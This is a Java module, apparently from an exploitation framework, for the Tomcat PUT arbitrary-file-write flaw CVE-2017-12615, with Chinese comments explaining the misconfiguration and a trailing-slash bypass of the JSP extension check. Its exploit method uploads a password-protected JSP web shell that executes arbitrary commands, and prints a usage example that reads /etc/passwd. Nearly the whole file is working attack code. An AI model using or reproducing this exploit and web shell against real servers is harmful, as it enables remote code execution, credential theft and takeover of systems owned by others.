package Module;

import Framework.HTTPinterface;

/**
 * Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）
 * 漏洞原理
 * 参考：
 * http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html
 * https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5
 * https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e
 * 漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：
 * <servlet>
 *     <servlet-name>default</servlet-name>
 *     <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
 *     <init-param>
 *         <param-name>debug</param-name>
 *         <param-value>0</param-value>
 *     </init-param>
 *     <init-param>
 *         <param-name>listings</param-name>
 *         <param-value>false</param-value>
 *     </init-param>
 *     <init-param>
 *         <param-name>readonly</param-name>
 *         <param-value>false</param-value>
 *     </init-param>
 *     <load-on-startup>1</load-on-startup>
 * </servlet>
 *
 * 虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/）来绕过了限制。
 */

public class Tomcat_PUT_RCE {
    public static Boolean check(String url){
        try {
            String result = HTTPinterface.OPTIONS(url +
                    "/nokali");
            if(result.contains("PUT")){
                return true;
            }else{
                return false;
            }
        }catch (Exception e) {
            return false;
        }
    }

    public static String exploit(String url){
        try{
            HTTPinterface.PUT(url+"nokalinokali.jsp/",
                    //jsp后的/是为了绕过防护
                    "<%@ page contentType=\"text/html;charset=GBK\"%>\n" +
                            //防止中文乱码
                            "<%\n" +
                            "    if (\"nokali\".equals(request.getParameter(\"pwd\"))) {\n" +
                            "        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"action\")).getInputStream();\n" +
                            "        int a = -1;\n" +
                            "        byte[] b = new byte[2048];\n" +
                            "        out.print(\"<pre>\");\n" +
                            "        while ((a = in.read(b)) != -1) {\n" +
                            "            out.print(new String(b));\n" +
                            "        }\n" +
                            "        out.print(\"</pre>\");\n" +
                            "    }\n" +
                            "\n" +
                            "%>\n");
            String result="[+]写入WEBSHELL成功，URL为："+url+"nokalinokali.jsp"+"    密码：nokali    参数名为action"+
                    "    使用例：http://xxx.com/nokalinokali.jsp?pwd=nokali&action=cat+/etc/passwd";
            return result;
        }catch (Exception e){
            return "[-]写入失败";
        }
    }
}
